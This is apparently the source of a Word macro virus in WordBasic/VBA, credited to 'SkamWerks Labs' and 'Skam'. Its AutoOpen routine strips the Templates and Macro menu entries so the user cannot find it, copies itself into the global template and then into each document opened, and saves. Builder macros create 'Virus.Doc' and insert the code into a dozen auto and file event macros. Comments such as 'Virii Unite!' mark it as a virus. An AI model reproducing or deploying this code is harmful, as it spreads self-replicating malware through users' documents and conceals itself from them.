   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        WordBasic.ToolsCustomizeMenus ResetAll:=1
        WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1
        WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&Tools", Context:=0, Remove:=1

        Rem What? No Payload?  WUSSY!

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!J

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub

   Attribute VB_Name = "Testbak"

   Public Sub MAIN()
   Dim button

   WordBasic.FileNew

   button = WordBasic.MsgBox("Word Loaded Successfully, I Will Now Create the Macro(s).  COOL?", 1)

   If button = 0 Then GoTo bye

   WordBasic.ToolsMacro Name:="Skammy", Show:=1, Edit:=1
   WordBasic.EditPaste
   WordBasic.DocClose 1

   WordBasic.ToolsMacro Name:="Skammy", Run:=1

   button = WordBasic.MsgBox("Macros Created! Now I have to Clean up the Macros (get rid of first 4 lines).  COOL?", 1)
   If button = 0 Then GoTo bye

   WordBasic.ToolsMacro Name:="Skammy", Edit:=1
   WordBasic.EditFind Find:="REM DO NOT MODIFY"
   WordBasic.ExtendSelection
   WordBasic.EditFind Find:="OKAY FOR MODIFICATION"
   WordBasic.WW6_EditClear
   WordBasic.DocClose 1

   WordBasic.ToolsMacro Name:="Skammy", Run:=1

   button = WordBasic.MsgBox("Document Created!. Returning control to SWLabs.  COOL?", 1)
   If button = 0 Then GoTo bye

   WordBasic.FileExit 1

   bye:

   button = WordBasic.MsgBox("You Either Chickened Out or Something Went Wrong. Returing Control to SWLabs. COOL?", 1)

   End Sub

   Attribute VB_Name = "Test"

   Public Sub MAIN()
   Dim button

   button = WordBasic.MsgBox("Word Loaded Successfully, I Will Now Create the Macro(s).  COOL?", 1)
   If button = 0 Then GoTo bye

   WordBasic.FileNewDefault
   WordBasic.FileSaveAs Name:="Virus.Doc", Format:=1
   WordBasic.EditPaste

   WordBasic.EditFind Find:=":AutoOpen", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="AutoOpen", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":AutoClose", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="AutoClose", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":AutoNew", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="AutoNew", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":AutoSave", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="AutoSave", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":AutoExec", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="AutoExec", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":AutoExit", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="AutoExit", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":FileOpen", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="FileOpen", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":FileNew", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="FileNew", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":FileClose", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="FileClose", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":FileSave", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="FileSave", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":FileSaveAs", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="FileSaveAs", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If

   WordBasic.EditFind Find:=":FileSaveAll", Wrap:=1
   If WordBasic.EditFindFound() Then
       WordBasic.ToolsMacro Name:="FileSaveAll", Show:=3, Edit:=1
       WordBasic.Insert Chr(13) + "EndCode:" + Chr(13)
       WordBasic.EditFind Find:="Sub MAIN", Wrap:=1
       WordBasic.EndOfLine
       WordBasic.EditPaste
       WordBasic.DocClose 1
   End If


   WordBasic.MsgBox "Document Created!. Returning control to SWLabs.  COOL?", 0
   WordBasic.FileExit 1

   bye:

   button = WordBasic.MsgBox("You Either Chickened Out or Something Went Wrong. Returing Control to SWLabs. COOL?", 1)
   WordBasic.FileExit 1

   End Sub
